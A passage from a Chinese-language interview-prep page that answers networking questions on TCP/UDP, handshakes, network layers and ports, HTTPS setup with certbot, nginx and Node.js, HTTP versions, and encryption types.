ASCII</td></tr><tr><td>语言支持</td><td>仅英文</td><td>全世界语言</td></tr><tr><td>存储空间</td><td>英文相同</td><td>非英文字符更大</td></tr><tr><td>用途</td><td>简单文本</td><td>通用文本</td></tr></tbody></table><p><strong>存储对比：</strong></p><ul><li>&quot;Hello&quot; - ASCII: 5 字节，UTF-8: 5 字节</li><li>&quot;你好&quot; - ASCII: 不支持，UTF-8: 6 字节</li><li>&quot;😊&quot; - ASCII: 不支持，UTF-8: 4 字节</li></ul><p><strong>使用建议：</strong></p><ul><li>新项目统一使用 UTF-8</li><li>可以处理多语言内容</li><li>避免乱码问题</li></ul><hr><h2 id="_12、tcp-和-udp-有什么区别-tcp-怎样确保数据正确性-tcp-头包含什么-tcp-属于哪一层" tabindex="-1">12、TCP 和 UDP 有什么区别？TCP 怎样确保数据正确性？TCP 头包含什么？TCP 属于哪一层？ <a class="header-anchor" href="#_12、tcp-和-udp-有什么区别-tcp-怎样确保数据正确性-tcp-头包含什么-tcp-属于哪一层" aria-label="Permalink to &quot;12、TCP 和 UDP 有什么区别？TCP 怎样确保数据正确性？TCP 头包含什么？TCP 属于哪一层？&quot;">​</a></h2><p><strong>TCP vs UDP 区别：</strong></p><table tabindex="0"><thead><tr><th>特性</th><th>TCP</th><th>UDP</th></tr></thead><tbody><tr><td>连接性</td><td>面向连接</td><td>无连接</td></tr><tr><td>可靠性</td><td>可靠传输</td><td>不保证可靠</td></tr><tr><td>顺序</td><td>保证顺序</td><td>不保证顺序</td></tr><tr><td>速度</td><td>较慢</td><td>较快</td></tr><tr><td>流量控制</td><td>有</td><td>无</td></tr><tr><td>拥塞控制</td><td>有</td><td>无</td></tr><tr><td>头部大小</td><td>20-60 字节</td><td>8 字节</td></tr><tr><td>传输方式</td><td>字节流</td><td>数据报</td></tr><tr><td>应用场景</td><td>文件传输、邮件、网页</td><td>视频直播、语音通话、DNS</td></tr></tbody></table><p><strong>TCP 确保数据正确性的机制：</strong></p><ol><li><p><strong>序列号和确认应答</strong></p><ul><li>每个数据包有序列号</li><li>接收方收到后发送 ACK</li><li>未收到 ACK 则重传</li></ul></li><li><p><strong>超时重传</strong></p><ul><li>发送方设置超时时间</li><li>超时未收到 ACK 则重传</li><li>动态调整超时时间</li></ul></li><li><p><strong>校验和</strong></p><ul><li>头部和数据都有校验和</li><li>检测数据损坏</li></ul></li><li><p><strong>流量控制（滑动窗口）</strong></p><ul><li>接收方通过窗口大小告知发送方发送能力</li><li>避免接收方缓冲区溢出</li></ul></li><li><p><strong>拥塞控制</strong></p><ul><li>慢启动</li><li>拥塞避免</li><li>快重传和快恢复</li><li>避免网络拥塞</li></ul></li></ol><p><strong>TCP 头包含：</strong></p><ul><li>源端口（16 bit）</li><li>目标端口（16 bit）</li><li>序列号（32 bit）</li><li>确认号（32 bit）</li><li>头部长度（4 bit）</li><li>保留（6 bit）</li><li>标志位：URG、ACK、PSH、RST、SYN、FIN（6 bit）</li><li>窗口大小（16 bit）</li><li>校验和（16 bit）</li><li>紧急指针（16 bit）</li><li>选项（可选，最长 40 字节）</li></ul><p><strong>TCP 属于哪一层：</strong></p><ul><li><strong>传输层</strong>（Transport Layer）</li><li>OSI 七层模型第 4 层</li><li>TCP/IP 四层模型第 3 层</li></ul><hr><h2 id="_13、请你写出-http-协议三次握手-四次挥手过程。最后介绍一下网络的五层模型。" tabindex="-1">13、请你写出 HTTP 协议三次握手，四次挥手过程。最后介绍一下网络的五层模型。 <a class="header-anchor" href="#_13、请你写出-http-协议三次握手-四次挥手过程。最后介绍一下网络的五层模型。" aria-label="Permalink to &quot;13、请你写出 HTTP 协议三次握手，四次挥手过程。最后介绍一下网络的五层模型。&quot;">​</a></h2><p><strong>三次握手（建立连接）：</strong></p><ol><li><p><strong>第一次握手（SYN）</strong></p><ul><li>客户端发送 <code>SYN=1, seq=x</code></li><li>客户端进入 <code>SYN_SENT</code> 状态</li><li>询问服务端是否可以建立连接</li></ul></li><li><p><strong>第二次握手（SYN+ACK）</strong></p><ul><li>服务端收到 SYN，回复 <code>SYN=1, ACK=1, ack=x+1, seq=y</code></li><li>服务端进入 <code>SYN_RCVD</code> 状态</li><li>确认可以建立连接，并询问客户端</li></ul></li><li><p><strong>第三次握手（ACK）</strong></p><ul><li>客户端收到 SYN+ACK，回复 <code>ACK=1, ack=y+1, seq=x+1</code></li><li>客户端进入 <code>ESTABLISHED</code> 状态</li><li>确认可以建立连接</li><li>服务端收到后也进入 <code>ESTABLISHED</code> 状态</li></ul></li></ol><p><strong>为什么要三次握手：</strong></p><ul><li>防止已失效的连接请求报文段突然又传到服务端</li><li>确认双方的接收和发送能力都正常</li></ul><p><strong>四次挥手（断开连接）：</strong></p><ol><li><p><strong>第一次挥手（FIN）</strong></p><ul><li>客户端发送 <code>FIN=1, seq=u</code></li><li>客户端进入 <code>FIN_WAIT_1</code> 状态</li><li>表示客户端无数据发送了</li></ul></li><li><p><strong>第二次挥手（ACK）</strong></p><ul><li>服务端收到 FIN，回复 <code>ACK=1, ack=u+1, seq=v</code></li><li>服务端进入 <code>CLOSE_WAIT</code> 状态</li><li>客户端收到后进入 <code>FIN_WAIT_2</code> 状态</li><li>表示服务端知道了客户端要关闭</li></ul></li><li><p><strong>第三次挥手（FIN）</strong></p><ul><li>服务端数据发送完毕，发送 <code>FIN=1, ACK=1, ack=u+1, seq=w</code></li><li>服务端进入 <code>LAST_ACK</code> 状态</li><li>表示服务端也要关闭了</li></ul></li><li><p><strong>第四次挥手（ACK）</strong></p><ul><li>客户端收到 FIN，回复 <code>ACK=1, ack=w+1, seq=u+1</code></li><li>客户端进入 <code>TIME_WAIT</code> 状态</li><li>等待 2MSL 后进入 <code>CLOSED</code> 状态</li><li>服务端收到后进入 <code>CLOSED</code> 状态</li></ul></li></ol><p><strong>为什么要四次挥手：</strong></p><ul><li>TCP 是全双工的，需要双方都确认关闭</li><li>服务端收到 FIN 后可能还有数据要发送，所以先 ACK 再 FIN</li></ul><p><strong>TIME_WAIT 作用：</strong></p><ul><li>确保最后的 ACK 能到达服务端</li><li>等待足够时间让旧报文自然消失</li></ul><p><strong>网络五层模型（TCP/IP 模型）：</strong></p><ol><li><p><strong>应用层</strong></p><ul><li>协议：HTTP、HTTPS、FTP、SMTP、DNS</li><li>功能：为应用程序提供网络服务</li><li>数据单位：报文</li></ul></li><li><p><strong>传输层</strong></p><ul><li>协议：TCP、UDP</li><li>功能：提供端到端的通信服务</li><li>数据单位：报文段/用户数据报</li></ul></li><li><p><strong>网络层</strong></p><ul><li>协议：IP、ICMP、ARP、RARP</li><li>功能：路由选择，实现主机间通信</li><li>数据单位：数据包/分组</li></ul></li><li><p><strong>数据链路层</strong></p><ul><li>协议：以太网、WiFi、PPP</li><li>功能：将数据包封装成帧，介质访问控制</li><li>数据单位：帧</li></ul></li><li><p><strong>物理层</strong></p><ul><li>设备：网线、光纤、网卡</li><li>功能：传输比特流</li><li>数据单位：比特</li></ul></li></ol><hr><h2 id="_14、传输层和网络层分别负责什么-端口在什么层标记" tabindex="-1">14、传输层和网络层分别负责什么，端口在什么层标记？ <a class="header-anchor" href="#_14、传输层和网络层分别负责什么-端口在什么层标记" aria-label="Permalink to &quot;14、传输层和网络层分别负责什么，端口在什么层标记？&quot;">​</a></h2><p><strong>传输层（Transport Layer）：</strong></p><ul><li><p><strong>功能：</strong></p><ul><li>提供端到端的通信服务</li><li>实现进程间通信</li><li>流量控制</li><li>拥塞控制</li><li>差错控制</li></ul></li><li><p><strong>协议：</strong></p><ul><li>TCP：面向连接、可靠传输</li><li>UDP：无连接、不可靠传输</li></ul></li><li><p><strong>数据单位：</strong></p><ul><li>报文段（TCP）</li><li>用户数据报（UDP）</li></ul></li><li><p><strong>作用：</strong></p><ul><li>区分不同的应用程序</li><li>保证数据顺序和完整性（TCP）</li></ul></li></ul><p><strong>网络层（Network Layer）：</strong></p><ul><li><p><strong>功能：</strong></p><ul><li>路由选择和转发</li><li>实现主机间通信</li><li>地址管理（IP 地址）</li><li>分组和重组</li></ul></li><li><p><strong>协议：</strong></p><ul><li>IP：网际协议</li><li>ICMP：互联网控制报文协议</li><li>ARP：地址解析协议</li><li>RARP：反向地址解析协议</li></ul></li><li><p><strong>数据单位：</strong></p><ul><li>数据包（Packet）</li></ul></li><li><p><strong>作用：</strong></p><ul><li>将数据包从源主机传输到目的主机</li><li>决定最佳路径（路由）</li></ul></li></ul><p><strong>端口（Port）：</strong></p><ul><li><strong>所在层：</strong> 传输层</li><li><strong>作用：</strong> 标识不同的应用程序或进程</li><li><strong>范围：</strong> 0-65535 <ul><li>0-1023：熟知端口（Well-known Ports）</li><li>1024-49151：注册端口（Registered Ports）</li><li>49152-65535：动态端口（Dynamic Ports）</li></ul></li></ul><p><strong>常见端口：</strong></p><ul><li>80：HTTP</li><li>443：HTTPS</li><li>22：SSH</li><li>21：FTP</li><li>25：SMTP</li><li>53：DNS</li><li>3306：MySQL</li><li>27017：MongoDB</li><li>3000：Node.js 默认端口</li><li>8080：备用 HTTP 端口</li></ul><p><strong>区分：</strong></p><ul><li>IP 地址：标记网络中的主机（网络层）</li><li>MAC 地址：标记网络接口卡（数据链路层）</li><li>端口：标记主机上的应用程序（传输层）</li></ul><hr><h2 id="_15、介绍一下-https-和-http-的区别是什么-https-为什么比-http-安全-如何配置" tabindex="-1">15、介绍一下 HTTPS 和 HTTP 的区别是什么？https 为什么比 HTTP 安全？如何配置？ <a class="header-anchor" href="#_15、介绍一下-https-和-http-的区别是什么-https-为什么比-http-安全-如何配置" aria-label="Permalink to &quot;15、介绍一下 HTTPS 和 HTTP 的区别是什么？https 为什么比 HTTP 安全？如何配置？&quot;">​</a></h2><p><strong>HTTP vs HTTPS 区别：</strong></p><table tabindex="0"><thead><tr><th>特性</th><th>HTTP</th><th>HTTPS</th></tr></thead><tbody><tr><td>协议</td><td>HTTP</td><td>HTTP + SSL/TLS</td></tr><tr><td>端口</td><td>80</td><td>443</td></tr><tr><td>安全性</td><td>明文传输，不安全</td><td>加密传输，安全</td></tr><tr><td>性能</td><td>稍快</td><td>稍慢（握手耗时）</td></tr><tr><td>证书</td><td>不需要</td><td>需要 SSL 证书</td></tr><tr><td>成本</td><td>免费</td><td>证书需付费（有免费选项）</td></tr><tr><td>SEO</td><td>排名较低</td><td>排名更高</td></tr></tbody></table><p><strong>HTTPS 比 HTTP 安全的原因：</strong></p><ol><li><p><strong>数据加密</strong></p><ul><li>所有数据加密传输</li><li>防止数据被窃听</li></ul></li><li><p><strong>身份验证</strong></p><ul><li>通过 SSL 证书验证服务器身份</li><li>防止中间人攻击</li></ul></li><li><p><strong>数据完整性</strong></p><ul><li>消息认证码（MAC）确保数据未被篡改</li><li>防止数据被修改</li></ul></li><li><p><strong>防止钓鱼</strong></p><ul><li>HTTPS + 证书 = 可信网站</li><li>浏览器显示锁图标</li></ul></li></ol><p><strong>HTTPS 配置步骤：</strong></p><p><strong>1. 获取 SSL 证书</strong></p><ul><li>免费：Let&#39;s Encrypt（推荐）</li><li>付费：DigiCert、Symantec 等</li></ul><p><strong>2. 安装证书</strong></p><ul><li>使用 Certbot（Let&#39;s Encrypt）</li></ul><div class="language-bash vp-adaptive-theme"><button title="Copy Code" class="copy"></button><span class="lang">bash</span><pre class="shiki shiki-themes github-light github-dark vp-code" tabindex="0"><code><span class="line"><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;"># 安装 Certbot</span></span>
<span class="line"><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">sudo</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> apt-get</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> install</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> certbot</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> python3-certbot-nginx</span></span>
<span class="line"></span>
<span class="line"><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;"># 获取证书</span></span>
<span class="line"><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">sudo</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> certbot</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;"> --nginx</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;"> -d</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> yourdomain.com</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;"> -d</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> www.yourdomain.com</span></span></code></pre></div><p><strong>3. Nginx 配置示例</strong></p><div class="language-nginx vp-adaptive-theme"><button title="Copy Code" class="copy"></button><span class="lang">nginx</span><pre class="shiki shiki-themes github-light github-dark vp-code" tabindex="0"><code><span class="line"><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">server</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;"> {</span></span>
<span class="line"><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">    listen </span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;">443</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;"> ssl http2;</span></span>
<span class="line"><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">    server_name </span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">yourdomain.com;</span></span>
<span class="line"></span>
<span class="line"><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">    ssl_certificate </span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">/etc/letsencrypt/live/yourdomain.com/fullchain.pem;</span></span>
<span class="line"><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">    ssl_certificate_key </span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">/etc/letsencrypt/live/yourdomain.com/privkey.pem;</span></span>
<span class="line"><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">    ssl_protocols </span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">TLSv1.2 TLSv1.3;</span></span>
<span class="line"><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">    ssl_ciphers </span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">HIGH:!aNULL:!MD5;</span></span>
<span class="line"></span>
<span class="line"><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;">    # 其他配置...</span></span>
<span class="line"><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">}</span></span>
<span class="line"></span>
<span class="line"><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;"># HTTP 重定向到 HTTPS</span></span>
<span class="line"><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">server</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;"> {</span></span>
<span class="line"><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">    listen </span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;">80</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">;</span></span>
<span class="line"><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">    server_name </span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">yourdomain.com;</span></span>
<span class="line"><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">    return</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;"> 301</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;"> https://$server_name$request_uri;</span></span>
<span class="line"><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">}</span></span></code></pre></div><p><strong>4. 自动续期</strong></p><div class="language-bash vp-adaptive-theme"><button title="Copy Code" class="copy"></button><span class="lang">bash</span><pre class="shiki shiki-themes github-light github-dark vp-code" tabindex="0"><code><span class="line"><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;"># 测试续期</span></span>
<span class="line"><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">sudo</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> certbot</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> renew</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;"> --dry-run</span></span>
<span class="line"></span>
<span class="line"><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;"># Certbot 自动续期（已配置）</span></span></code></pre></div><p><strong>Node.js 配置示例：</strong></p><div class="language-javascript vp-adaptive-theme"><button title="Copy Code" class="copy"></button><span class="lang">javascript</span><pre class="shiki shiki-themes github-light github-dark vp-code" tabindex="0"><code><span class="line"><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">const</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;"> https</span><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;"> =</span><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;"> require</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">(</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;">&#39;https&#39;</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">);</span></span>
<span class="line"><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">const</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;"> fs</span><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;"> =</span><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;"> require</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">(</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;">&#39;fs&#39;</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">);</span></span>
<span class="line"><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">const</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;"> express</span><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;"> =</span><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;"> require</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">(</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;">&#39;express&#39;</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">);</span></span>
<span class="line"></span>
<span class="line"><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">const</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;"> app</span><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;"> =</span><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;"> express</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">();</span></span>
<span class="line"></span>
<span class="line"><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">const</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;"> options</span><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;"> =</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;"> {</span></span>
<span class="line"><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">  key: fs.</span><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">readFileSync</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">(</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;">&#39;/path/to/private-key.pem&#39;</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">),</span></span>
<span class="line"><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">  cert: fs.</span><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">readFileSync</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">(</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;">&#39;/path/to/certificate.pem&#39;</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">),</span></span>
<span class="line"><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">  ca: fs.</span><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">readFileSync</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">(</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;">&#39;/path/to/ca-bundle.pem&#39;</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">)</span></span>
<span class="line"><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">};</span></span>
<span class="line"></span>
<span class="line"><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">https.</span><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">createServer</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">(options, app).</span><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">listen</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">(</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;">443</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">);</span></span>
<span class="line"></span>
<span class="line"><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;">// HTTP 重定向</span></span>
<span class="line"><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">const</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;"> httpApp</span><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;"> =</span><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;"> express</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">();</span></span>
<span class="line"><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">httpApp.</span><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">use</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">((</span><span style="--shiki-light:#E36209;--shiki-dark:#FFAB70;">req</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">, </span><span style="--shiki-light:#E36209;--shiki-dark:#FFAB70;">res</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">) </span><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">=&gt;</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;"> {</span></span>
<span class="line"><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">  res.</span><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">redirect</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">(</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;">`https://${</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">req</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;">.</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">headers</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;">.</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">host</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;">}${</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">req</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;">.</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">url</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;">}`</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">);</span></span>
<span class="line"><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">});</span></span>
<span class="line"><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">httpApp.</span><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">listen</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">(</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;">80</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">);</span></span></code></pre></div><p><strong>5. 混合内容修复</strong></p><ul><li>确保所有资源都使用 HTTPS</li><li>检查并替换 HTTP 链接</li></ul><hr><h2 id="_16、http1、http2、http3-分别有什么最大的区别-http2-怎么确保文件同时传输不会报错" tabindex="-1">16、HTTP1、HTTP2、HTTP3 分别有什么最大的区别？http2 怎么确保文件同时传输不会报错？ <a class="header-anchor" href="#_16、http1、http2、http3-分别有什么最大的区别-http2-怎么确保文件同时传输不会报错" aria-label="Permalink to &quot;16、HTTP1、HTTP2、HTTP3 分别有什么最大的区别？http2 怎么确保文件同时传输不会报错？&quot;">​</a></h2><p><strong>HTTP/1.x vs HTTP/2 vs HTTP/3：</strong></p><p><strong>HTTP/1.0 / HTTP/1.1：</strong></p><ul><li><strong>HTTP/1.0</strong>：每次请求都需要建立新连接</li><li><strong>HTTP/1.1</strong>： <ul><li>持久连接</li><li>管道化</li><li>仍然存在队头阻塞</li></ul></li></ul><p><strong>HTTP/1.x 问题：</strong></p><ul><li>队头阻塞</li><li>请求/响应头不压缩</li><li>只能串行发送请求</li></ul><p><strong>HTTP/2：</strong></p><ul><li><strong>二进制协议</strong>：不再是文本协议</li><li><strong>多路复用</strong>：同一连接可并发多个请求，解决队头阻塞</li><li><strong>头部压缩</strong>：使用 HPACK 算法压缩头部</li><li><strong>服务器推送</strong>：服务器可主动推送资源</li><li><strong>请求优先级</strong>：设置请求优先级</li><li><strong>流量控制</strong>：精细化流量控制</li></ul><p><strong>HTTP/3：</strong></p><ul><li>基于 QUIC 协议（UDP）</li><li>解决 TCP 层的队头阻塞</li><li>连接迁移（网络切换不中断）</li><li>更快的握手（0-RTT）</li><li>改进的拥塞控制</li></ul><p><strong>最大区别总结：</strong></p><table tabindex="0"><thead><tr><th>特性</th><th>HTTP/1.1</th><th>HTTP/2</th><th>HTTP/3</th></tr></thead><tbody><tr><td>传输层</td><td>TCP</td><td>TCP</td><td>UDP (QUIC)</td></tr><tr><td>并发</td><td>串行</td><td>多路复用</td><td>多路复用</td></tr><tr><td>队头阻塞</td><td>存在</td><td>应用层解决</td><td>传输层解决</td></tr><tr><td>头部压缩</td><td>无</td><td>HPACK</td><td>QPACK</td></tr><tr><td>服务器推送</td><td>无</td><td>支持</td><td>支持</td></tr><tr><td>二进制协议</td><td>文本</td><td>二进制</td><td>二进制</td></tr><tr><td>连接迁移</td><td>不支持</td><td>不支持</td><td>支持</td></tr><tr><td>握手时间</td><td>1-RTT</td><td>1-RTT</td><td>0-RTT</td></tr></tbody></table><p><strong>HTTP/2 如何确保文件同时传输不会报错：</strong></p><ol><li><p><strong>流标识（Stream ID）</strong></p><ul><li>每个请求/响应对分配一个唯一的流 ID</li><li>奇数 ID：客户端发起</li><li>偶数 ID：服务端发起</li></ul></li><li><p><strong>帧（Frame）机制</strong></p><ul><li>消息被分割成多个帧</li><li>每个帧包含流 ID</li><li>不同流的帧可以交错传输</li></ul></li><li><p><strong>帧类型</strong></p><ul><li>HEADERS：头部帧</li><li>DATA：数据帧</li><li>SETTINGS：设置帧</li><li>PRIORITY：优先级帧</li><li>RST_STREAM：重置流</li><li>PING：心跳帧</li><li>WINDOW_UPDATE：流量控制帧</li></ul></li><li><p><strong>流状态机</strong></p><ul><li>每个流有独立的状态</li><li>IDLE → OPEN → HALF-CLOSED → CLOSED</li><li>可以独立控制流的关闭</li></ul></li><li><p><strong>优先级和依赖</strong></p><ul><li>可以设置流的优先级</li><li>流可以依赖于其他流</li><li>确保重要资源优先传输</li></ul></li><li><p><strong>流量控制</strong></p><ul><li>每个流独立控制窗口大小</li><li>防止发送方淹没接收方</li><li>WINDOW_UPDATE 帧更新窗口</li></ul></li><li><p><strong>错误处理</strong></p><ul><li>错误不会影响整个连接</li><li>使用 RST_STREAM 帧重置单个流</li><li>连接错误才关闭连接</li></ul></li><li><p><strong>头部压缩（HPACK）</strong></p><ul><li>静态表：常用头部</li><li>动态表：自定义头部</li><li>避免重复传输相同的头部</li></ul></li></ol><p><strong>工作流程示例：</strong></p><div class="language- vp-adaptive-theme"><button title="Copy Code" class="copy"></button><span class="lang"></span><pre class="shiki shiki-themes github-light github-dark vp-code" tabindex="0"><code><span class="line"><span>客户端发起请求1（Stream ID 1）→ HEADERS 帧</span></span>
<span class="line"><span>客户端发起请求2（Stream ID 3）→ HEADERS 帧</span></span>
<span class="line"><span>服务端响应2（Stream ID 3）→ HEADERS 帧 → DATA 帧</span></span>
<span class="line"><span>服务端响应1（Stream ID 1）→ HEADERS 帧 → DATA 帧</span></span></code></pre></div><p>这样，多个请求可以并发传输，互不影响。</p><hr><h2 id="_17、对称加密和非对称加密的区别和用处是什么" tabindex="-1">17、对称加密和非对称加密的区别和用处是什么？ <a class="header-anchor" href="#_17、对称加密和非对称加密的区别和用处是什么" aria-label="Permalink to &quot;17、对称加密和非对称加密的区别和用处是什么？&quot;">​</a></h2><p><strong>对称加密：</strong></p><ul><li><p><strong>特点：</strong></p><ul><li>加密和解密使用相同的密钥</li><li>加密解密速度快</li><li>密钥分发困难</li><li>密钥管理复杂（N个用户需要 N*(N-1)/2 个密钥）</li></ul></li><li><p><strong>常用算法：</strong></p><ul><li>AES（Advanced Encryption Standard）</li><li>DES（Data Encryption Standard，已不安全）</li><li>3DES</li><li>RC4（已不安全）</li></ul></li><li><p><strong>使用场景：</strong></p><ul><li>大量数据加密（如文件、数据库）</li><li>传输大量数据时</li><li>性能要求高的场景</li></ul></li><li><p><strong>优点：</strong></p><ul><li>加密解密速度快</li><li>算法相对简单</li><li>适合大数据量</li></ul></li><li><p><strong>缺点：</strong></p><ul><li>密钥分发困难</li><li>密钥管理复杂</li><li>无法实现数字签名</li></ul></li></ul><p><strong>非对称加密：</strong></p><ul><li><p><strong>特点：</strong></p><ul><li>加密和解密使用不同的密钥（公钥和私钥）</li><li>公钥加密只能用私钥解密</li><li>私钥加密（签名）只能用公钥验证</li><li>速度较慢</li><li>密钥管理简单（N个用户只需2N个密钥）</li></ul></li><li><p><strong>常用算法：</strong></p><ul><li>RSA</li><li>ECC（Elliptic Curve 